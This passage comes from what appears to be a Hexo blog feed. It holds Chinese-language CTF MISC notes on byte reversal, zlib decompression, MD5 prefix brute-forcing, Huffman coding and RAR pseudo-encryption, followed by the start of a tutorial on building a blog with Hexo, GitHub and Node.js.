id="23-十六进制文件头尾逆序"><a href="#23-十六进制文件头尾逆序" class="headerlink" title="23.十六进制文件头尾逆序"></a>23.十六进制文件头尾逆序</h2><p><strong>[HGAME2021]-Hallucigenia</strong></p><p>用Stegslove打开进行异或<img src="https://img-blog.csdnimg.cn/20210215154954283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码，是⼆进制⽂件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=<br></code></pre></td></tr></table></figure><p>使用脚本生成二进制文件flag.bin</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">from base64 import b64decode<br>open(<span class="hljs-string">&#x27;flag.bin&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>).write(b64decode(open(<span class="hljs-string">&#x27;flag_inv_b64.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-built_in">read</span>()))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210215160956290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>⽤ 16 进制编辑器打开可以发现有 PNG、IHDR 等字样，文件头尾逆序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>).write(b64decode(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;h.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read())[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>得到flag.png<br><img src="https://img-blog.csdnimg.cn/20210215160150279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上下翻转镜像，得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hgame&#123;tenchi_souzou_dezain_bu&#125;<br></code></pre></td></tr></table></figure><p>使用十六进制文件头尾逆序脚本，颠倒十六进制文件flag.bin也可以得到flag.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">input</span> = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>input_all = <span class="hljs-built_in">input</span>.read()<br>ss = input_all[::-<span class="hljs-number">1</span>]<br>output = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>output.write(ss)<br><span class="hljs-built_in">input</span>.close()<br>output.close()<br></code></pre></td></tr></table></figure><h2 id="24-zlib解压"><a href="#24-zlib解压" class="headerlink" title="24.zlib解压"></a>24.zlib解压</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\CTF\pngcheck&gt;pngcheck.exe -v pngcheck.png<br>File: pngcheck.png (135570 bytes)<br>  chunk IHDR at offset 0x0000c, length 13<br>    600 x 379 image, 24-bit RGB, non-interlaced<br>  chunk pHYs at offset 0x00025, length 9: 3827x3827 pixels/meter (97 dpi)<br>  chunk tEXt at offset 0x0003a, length 17, keyword: Title<br>  chunk tEXt at offset 0x00057, length 19, keyword: Author<br>  chunk zTXt at offset 0x00076, length 45, keyword: Description<br>  chunk IDAT at offset 0x000af, length 135317<br>    zlib: deflated, 32K window, maximum compression<br>  chunk IDAT at offset 0x21150, length 92:  EOF <span class="hljs-keyword">while</span> reading data<br>ERRORS DETECTED <span class="hljs-keyword">in</span> pngcheck.png<br></code></pre></td></tr></table></figure><p>最后那段IDAT块，读取数据时发生错误,可能存在zlib压缩<br><img src="https://img-blog.csdnimg.cn/20210317221124325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>脚本1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br>s = <span class="hljs-string">&#x27;789C4BCB494CAF4E4B36324D4E4A324FB230B534B54C4B35303637B63032314CB4344B4A33324EA90500E9E20B5FD01C68080000000049454E44AE426082&#x27;</span><br>b = <span class="hljs-built_in">bytes</span>.fromhex(s)<br>flag = zlib.decompress(b)<br>print(flag)<br></code></pre></td></tr></table></figure><p>脚本2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br>s = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">78 9C 5D 91 01 12 80 40 08 02 BF 04 FF FF 5C 75</span><br><span class="hljs-string">29 4B 55 37 73 8A 21 A2 7D 1E 49 CF D1 7D B3 93</span><br><span class="hljs-string">7A 92 E7 E6 03 88 0A 6D 48 51 00 90 1F B0 41 01</span><br><span class="hljs-string">53 35 0D E8 31 12 EA 2D 51 C5 4C E2 E5 85 B1 5A</span><br><span class="hljs-string">2F C7 8E 88 72 F5 1C 6F C1 88 18 82 F9 3D 37 2D</span><br><span class="hljs-string">EF 78 E6 65 B0 C3 6C 52 96 22 A0 A4 55 88 13 88</span><br><span class="hljs-string">33 A1 70 A2 07 1D DC D1 82 19 DB 8C 0D 46 5D 8B</span><br><span class="hljs-string">69 89 71 96 45 ED 9C 11 C3 6A E3 AB DA EF CF C0</span><br><span class="hljs-string">AC F0 23 E7 7C 17 C7 89 76 67 D9 CF A5 A8 00 00</span><br><span class="hljs-string">00 00 49 45 4E 44 AE 42 60 82</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>s = s.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>b = <span class="hljs-built_in">bytes</span>.fromhex(s)<br>flag = zlib.decompress(b)<br>print(flag)<br><br></code></pre></td></tr></table></figure><p>运行得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;fc25cbb7b85959fe03738241a96bf23d&#125;<br></code></pre></td></tr></table></figure><h2 id="25-爆破hash"><a href="#25-爆破hash" class="headerlink" title="25. 爆破hash"></a>25. 爆破hash</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(s).hexdigest()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">9999999</span>):<br>    <span class="hljs-keyword">if</span> md5(<span class="hljs-built_in">str</span>(i)).startswith(<span class="hljs-string">&#x27;bf5ede&#x27;</span>):<br>        <span class="hljs-built_in">print</span> i<br><span class="hljs-comment">#找到md5前6位是bf5ede的值</span><br></code></pre></td></tr></table></figure><h2 id="26-哈夫曼编码"><a href="#26-哈夫曼编码" class="headerlink" title="26. 哈夫曼编码"></a>26. 哈夫曼编码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">Surprise<br>Wabby Wabby: <br>j 29<br>z 31<br>7 25<br>e 31<br>l 23<br>6 37<br>4 32<br>p 38<br>h 27<br>g 26<br>x 28<br>i 25<br>u 27<br>n 25<br>8 36<br>0 24<br>o 23<br>c 28<br>y 24<br>1 29<br>b 26<br>m 27<br>2 28<br>v 25<br>d 33<br>f 28<br>9 33<br>t 21<br>w 22<br>a 31<br>r 24<br>s 16<br>k 32<br>5 25<br>q 23<br>3 32<br>&#123; 1<br>- 4<br>&#125; 1<br>Wabby Wabbo: <brbr>surprise message len: 1000<br></code></pre></td></tr></table></figure><p>参考<a href="https://blog.csdn.net/gschen_cn/article/details/105898143">Python|Huffman编码的python代码实现</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#节点类</span><br>class Node(object):<br>    def __init__(self,name=None,value=None):<br>        self._name=name<br>        self._value=value<br>        self._left=None<br>        self._right=None<br><span class="hljs-comment">#哈夫曼树类</span><br>class HuffmanTree(object):<br><span class="hljs-comment">#根据Huffman树的思想：以叶子节点为基础，反向建立Huffman树</span><br>    def __init__(self,char_weights):<br>        self.a=[Node(part[0],part[1]) <span class="hljs-keyword">for</span> part <span class="hljs-keyword">in</span> char_weights] <span class="hljs-comment">#根据输入的字符及其频数生成叶子节点</span><br>        <span class="hljs-keyword">while</span> len(self.a)!=1:<br>                self.a.sort(key=lambda node:node._value,reverse=True)<br>                c=Node(value=(self.a[-1]._value+self.a[-2]._value))<br>                c._left=self.a.pop(-1)<br>                c._right=self.a.pop(-1)<br>                self.a.append(c)<br>        self.root=self.a[0]<br>        self.b=list(range(10))<br>    <span class="hljs-comment">#用递归的思想生成编码</span><br>    def pre(self,tree,length):<br>        node=tree<br>        <span class="hljs-keyword">if</span> (not node):<br>                <span class="hljs-built_in">return</span><br>        <span class="hljs-keyword">elif</span> node._name:<br>                x=str(node._name) + <span class="hljs-string">&#x27;的编码为:&#x27;</span><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(length):<br>                        x+=str(self.b[i])<br>                <span class="hljs-built_in">print</span>(x)<br>                <span class="hljs-built_in">return</span><br>        self.b[length]=0<br>        self.pre(node._left,length+1)<br>        self.b[length]=1<br>        self.pre(node._right,length+1)<br>    <span class="hljs-comment">#生成哈夫曼编码</span><br>    def get_code(self):<br>        self.pre(self.root,0)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment">#输入的是字符及其频数</span><br>        char_weights=[(<span class="hljs-string">&#x27;j&#x27;</span>,29),(<span class="hljs-string">&#x27;z&#x27;</span>,31),(<span class="hljs-string">&#x27;7&#x27;</span>,25),(<span class="hljs-string">&#x27;e&#x27;</span>,31),(<span class="hljs-string">&#x27;l&#x27;</span>,23),(<span class="hljs-string">&#x27;6&#x27;</span>,37),(<span class="hljs-string">&#x27;4&#x27;</span>,32),(<span class="hljs-string">&#x27;p&#x27;</span>,38),(<span class="hljs-string">&#x27;h&#x27;</span>,27),(<span class="hljs-string">&#x27;g&#x27;</span>,26),(<span class="hljs-string">&#x27;x&#x27;</span>,28),(<span class="hljs-string">&#x27;i&#x27;</span>,25),(<span class="hljs-string">&#x27;u&#x27;</span>,27),(<span class="hljs-string">&#x27;n&#x27;</span>,25),(<span class="hljs-string">&#x27;8&#x27;</span>,36),(<span class="hljs-string">&#x27;0&#x27;</span>,24),(<span class="hljs-string">&#x27;o&#x27;</span>,23),(<span class="hljs-string">&#x27;c&#x27;</span>,28),(<span class="hljs-string">&#x27;y&#x27;</span>,24),(<span class="hljs-string">&#x27;1&#x27;</span>,29),(<span class="hljs-string">&#x27;b&#x27;</span>,26),(<span class="hljs-string">&#x27;m&#x27;</span>,27),(<span class="hljs-string">&#x27;2&#x27;</span>,28),(<span class="hljs-string">&#x27;v&#x27;</span>,25),(<span class="hljs-string">&#x27;d&#x27;</span>,33),(<span class="hljs-string">&#x27;f&#x27;</span>,28),(<span class="hljs-string">&#x27;9&#x27;</span>,33),(<span class="hljs-string">&#x27;t&#x27;</span>,21),(<span class="hljs-string">&#x27;w&#x27;</span>,22),(<span class="hljs-string">&#x27;a&#x27;</span>,31),(<span class="hljs-string">&#x27;r&#x27;</span>,24),(<span class="hljs-string">&#x27;s&#x27;</span>,16),(<span class="hljs-string">&#x27;k&#x27;</span>,32),(<span class="hljs-string">&#x27;5&#x27;</span>,25),(<span class="hljs-string">&#x27;q&#x27;</span>,23),(<span class="hljs-string">&#x27;3&#x27;</span>,32),(<span class="hljs-string">&#x27;&#123;&#x27;</span>,1),(<span class="hljs-string">&#x27;-&#x27;</span>,4),(<span class="hljs-string">&#x27;&#125;&#x27;</span>,1)]<br>        tree=HuffmanTree(char_weights)<br>        tree.get_code()<br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">0的编码为:00000<br>5的编码为:00001<br>i的编码为:00010<br>7的编码为:00011<br>v的编码为:00100<br>n的编码为:00101<br>b的编码为:00110<br>g的编码为:00111<br>m的编码为:01000<br>u的编码为:01001<br>h的编码为:01010<br>f的编码为:01011<br>2的编码为:01100<br>c的编码为:01101<br>x的编码为:01110<br>1的编码为:01111<br>j的编码为:10000<br>a的编码为:10001<br>e的编码为:10010<br>z的编码为:10011<br>3的编码为:10100<br>k的编码为:10101<br>4的编码为:10110<br>9的编码为:10111<br>d的编码为:11000<br>8的编码为:11001<br>6的编码为:11010<br>p的编码为:11011<br>t的编码为:111000<br>&#125;的编码为:111001000<br>&#123;的编码为:111001001<br>-的编码为:11100101<br>s的编码为:1110011<br>w的编码为:111010<br>q的编码为:111011<br>o的编码为:111100<br>l的编码为:111101<br>r的编码为:111110<br>y的编码为:111111<br></code></pre></td></tr></table></figure><h2 id="27-RAR"><a href="#27-RAR" class="headerlink" title="27. RAR"></a>27. RAR</h2><h3 id="RAR文件格式"><a href="#RAR文件格式" class="headerlink" title="RAR文件格式"></a>RAR文件格式</h3><p>参考文章：<a href="https://www.freebuf.com/column/199854.html">https://www.freebuf.com/column/199854.html</a></p><p>RAR是有四个文件块组成的，分别是分别是标记块、归档头部块、文件块、结束块，这些块之间没有固定地先后顺序，但要求第一个块必须是标志块并且其后紧跟一个归档头部块。每个块都包含以下内容：<br><img src="https://img-blog.csdnimg.cn/20210405172920858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>归档头部块和文件块的内容较多，斗哥仅列出每个块头部内容：<br><img src="https://img-blog.csdnimg.cn/20210405172938417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>RAR的标记块和结束块都是固定的7字节序列，分别为0x52 61 72 21 1A 07 00和0xC4 3D 7B 00 40 07 00。文件块这边要注意一下HEAD_FLAGS这个头部，其中HEAD_FLAGS的低三位代表加密标志，此位若被置为1，则文件使用了基于密钥的加密。</p><h3 id="RAR伪加密"><a href="#RAR伪加密" class="headerlink" title="RAR伪加密"></a>RAR伪加密</h3><p>参考<a href="https://l1near.top/index.php/2021/03/15/97.html#comment-174">L1near师傅的博客</a></p><p>我们可以看到RAR第24字节这个地方，对应着一个PASSWORD_ENCRYPTED，所以如果某RAR文件没有被加密，那么这一行中的数字为0，将其修改为1<br><img src="https://img-blog.csdnimg.cn/20210405173804707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将其从1改为0就可以正常打开文件了。</p><p>也可以直接winhex或者010editor打开，把第24字节的后面一个4改成0也可以。（即从24变成20）</p><h3 id="RAR文件受损"><a href="#RAR文件受损" class="headerlink" title="RAR文件受损"></a>RAR文件受损</h3><p>分析RAR文件结构，文件块的HEAD_TYPE应该是0x74而不是0x7A，修改为74后保存。<br><img src="https://img-blog.csdnimg.cn/20210405174214487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="28-USB流量分析"><a href="#28-USB流量分析" class="headerlink" title="28. USB流量分析"></a>28. USB流量分析</h2><p>详见<a href="https://blog.csdn.net/qq_46150940/article/details/115431953">https://blog.csdn.net/qq_46150940/article/details/115431953</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人博客搭建历程</title>
    <link href="/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/"/>
    <url>/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>摘要：使用Hexo+github搭建博客</p> <a id="more"></a><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、hexo：提供博客框架，高效。<br>2、Node.js: 环境所需；Chrome上的JavaScript运行引擎，我们会用到 bode.js下的包管理器npm。<br>3、Git: 环境所需；免费、开源的分布式版本控制系统。<br>4、GitHub: 提供免费服务器，还有代码托管等功能。<br></code></pre></td></tr></table></figure><h2 id="Github的创建和配置"><a href="#Github的创建和配置" class="headerlink" title="Github的创建和配置"></a>Github的创建和配置</h2><p>官网：<a href="https://github.com/">https://github.com/</a></p><p><strong>1.注册账号</strong><br><img src="https://img-blog.csdnimg.cn/20210131213504600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2.新建仓库</strong><br>新建一个储存仓库，username为github用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username.github.io<br></code></pre></td></tr></table></figure><p>在主页右上角，点击加号，找到<code>New repository</code>，点进去会显示如下界面，输入仓库名，点击创建</p><p>Repository name格式推荐写成<code>username.github.io</code>,点击Create repository<br><img src="https://img-blog.csdnimg.cn/20210131214016120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>下载地址：<a href="https://git-scm.com/">https://git-scm.com/</a></p><p>一路next，打开cmd命令行，成功页面如下<br><img src="https://img-blog.csdnimg.cn/20210131140623911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打开Git-Bash工具 ，初始化Git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.配置用户名<br>git config --global user.name <span class="hljs-string">&quot;用户名&quot;</span><br><span class="hljs-comment">#用户名可以不是Github用户名，为了方便，设置一致。</span><br>2.配置邮箱<br>git config --global user.email <span class="hljs-string">&quot;邮箱地址&quot;</span><br>3.查看已配置的用户信息<br>git config --global list<br></code></pre></td></tr></table></figure><h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>下载地址：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a><br><img src="https://img-blog.csdnimg.cn/20210131140950940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打开cmd，进入文件目录，安装成功如下<br><img src="https://img-blog.csdnimg.cn/20210131141134259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了加快速度，npm换源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Program Files\nodejs&gt;npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br><br>C:\Program Files\nodejs&gt;npm config get registry<br>https://registry.npm.taobao.org/<br></code></pre></td></tr></table></figure><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>本地安装hexo前，应该先创建一个新文件夹blog</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> f:/hexo<br><br>$ npm install hexo-cli -g<br><br>$ hexo init blog<br><br>$ <span class="hljs-built_in">cd</span> blog<br><br>$ npm install<br><br>$ hexo g <span class="hljs-comment"># 或者hexo generate</span><br><br>$ hexo s <span class="hljs-comment"># 或者hexo server，可以在http://localhost:4000/ 查看</span><br></code></pre></td></tr></table></figure><p>hexo命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate (hexo g) 生成静态文件，会在当前目录下生成一个新的叫做public的文件夹<br><br>hexo server (hexo s) 启动本地web服务，用于博客的预览<br><br>hexo deploy (hexo d) 部署播客到远端（比如github, heroku等平台）<br><br><span class="hljs-variable">$hexo</span> new <span class="hljs-string">&quot;postName&quot;</span> <span class="hljs-comment">#新建文章</span><br>$ hexo new page <span class="hljs-string">&quot;pageName&quot;</span> <span class="hljs-comment">#新建页面</span><br>$ hexo d -g <span class="hljs-comment">#生成部署</span><br>$ hexo s -g <span class="hljs-comment">#生成预览</span><br></code></pre></td></tr></table></figure><p>本地hexo配置情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\admin&gt;hexo -v<br>hexo-cli: 4.2.0<br>os: Windows_NT 10.0.19041 win32 x64<br>node: 14.15.4<br>v8: 8.4.371.19-node.17<br>uv: 1.40.0<br>zlib: 1.2.11<br>brotli: 1.0.9<br>ares: 1.16.1<br>modules: 83<br>nghttp2: 1.41.0<br>napi: 7<br>llhttp: 2.1.3<br>openssl: 1.1.1i<br>cldr: 37.0<br>icu: 